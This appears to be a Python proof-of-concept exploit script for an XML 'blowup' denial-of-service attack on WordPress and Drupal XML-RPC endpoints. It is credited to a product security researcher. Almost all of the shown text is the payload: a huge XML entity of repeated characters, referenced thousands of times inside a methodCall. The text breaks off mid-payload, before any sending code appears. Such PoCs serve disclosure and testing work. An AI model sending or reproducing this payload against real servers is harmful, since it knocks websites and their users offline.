#!/usr/bin/env python
"""
#############################################################################
# CVE-XXXXX Wordpress and Drupal XML Blowup Attack DoS                      #
# Author: Nir Goldshlager - Salesforce.com Product Security Team            #
# This is a Proof of Concept Exploit, Please use responsibly.               #
#############################################################################
"""
from __future__ import print_function
from itertools import cycle
from threading import Thread
import time
import argparse
import sys

try:
    import urlparse
except ImportError:
    from urllib import parse as urlparse

try:
    from urllib import quote
except ImportError:
    from urllib.parse import quote

try:
    import urllib2
except ImportError:
    from urllib import request as urllib2


DATA = b"""<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE lolz [
 <!ENTITY poc "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<methodCall>
  <methodName>aaa&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&po